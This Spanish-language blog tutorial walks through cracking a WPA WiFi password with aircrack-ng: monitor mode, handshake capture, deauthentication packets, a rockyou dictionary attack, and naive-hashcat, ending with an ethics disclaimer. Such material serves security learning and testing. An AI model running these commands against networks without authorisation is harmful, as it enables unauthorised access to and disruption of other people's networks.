---
layout: single
title: "WiFi Hacking: Fuerza Bruta y Métodos Adicionales"
excerpt: "En este artículo se explica cómo realizar un ataque de fuerza bruta a una red WiFi utilizando herramientas como Aircrack-ng, y se presentan métodos adicionales para obtener contraseñas."
date: 2025-04-02
classes: wide
header:
  teaser: /assets/images/ruyztz/wifi-hacking.png
  teaser_home_page: true
categories:
  - Seguridad
  - Hacking
tags:
  - WiFi
  - Hacking
  - Seguridad
  - Aircrack-ng
---

# Hacking WiFi: Fuerza Bruta y Métodos Adicionales

Este artículo detalla los pasos básicos para hackear una red WiFi mediante un ataque de fuerza bruta utilizando **Aircrack-ng** y describe métodos adicionales para obtener la contraseña.

## Pasos para hackear una red WiFi

1. **Conectar la antena.**

2. **Instalar Aircrack-ng:**

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>sudo apt install aircrack-ng</code></pre>
</div>

3. **Cambiar a usuario root:**

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>sudo su</code></pre>
</div>

4. **Verificar y matar procesos que puedan interferir con la antena:**

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>airmon-ng check 
airmon-ng check kill</code></pre>
</div>

5. **Iniciar la antena en modo monitor:**  
   (Utiliza el nombre de la antena que se muestra con el comando `ifconfig`.)

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>airmon-ng start nombreAntena</code></pre>
</div>

6. **Escanear las redes disponibles:**

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>airodump-ng nombreAntenaModoMonitor</code></pre>
</div>

7. **Identificar el BSSID** de la red a la que se quiere acceder.

8. **Capturar paquetes para obtener el handshake:**

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>airodump-ng -c NumeroCanalDeLaRed --bssid bssid -w nombreArchivosCaps nombreAntenaModoMonitor</code></pre>
</div>

9. **Enviar paquetes de desautenticación:**  
   Mantén abierto el terminal y ejecuta:

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>sudo aireplay-ng -0 9 -a bssid -c estaciónDesautenticada nombreAntenaModoMonitor</code></pre>
</div>

10. **Realizar el ataque de fuerza bruta:**

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>aircrack-ng -b handshakeObtenido -w rockyou.txt archivo.cap</code></pre>
</div>

11. **Detener la antena en modo monitor:**

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>airmon-ng stop nombreAntena</code></pre>
</div>

## Métodos adicionales para obtener la contraseña

Si cuentas con un ordenador con Linux nativo, puedes seguir estos pasos:

1. **Clonar el repositorio de naive-hashcat:**

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>git clone https://github.com/brannondorsey/naive-hashcat</code></pre>
</div>

2. **Compilar el código en el directorio `src`:**

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>cd naive-hashcat/src
make</code></pre>
</div>

3. **Convertir el archivo `.cap` a `.hccapx`:**

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>cap2hccapx.bin archivo.cap archivoHash.hccapx</code></pre>
</div>

4. **Descargar el diccionario rockyou:**

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>curl -LO https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</code></pre>
</div>

5. **Ejecutar naive-hashcat:**

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>HASH_FILE=archivoHash.hccapx POT_FILE=archivo.pot HASH_TYPE=2500 ./naive-hashcat.sh</code></pre>
</div>

## Alternativas y Recursos

- **Alternativas en línea:**
  - [Online Hash Crack](https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php)
  - [GPU Hash](https://gpuhash.me/)

- **Más Información:**
  Consulta el repositorio [wifi-cracking](https://github.com/brannondorsey/wifi-cracking) para obtener más detalles y métodos adicionales.

> **Importante:** Estos conocimientos deben utilizarse de forma ética y legal. Realiza pruebas únicamente en entornos controlados o en redes sobre las que tengas autorización expresa.
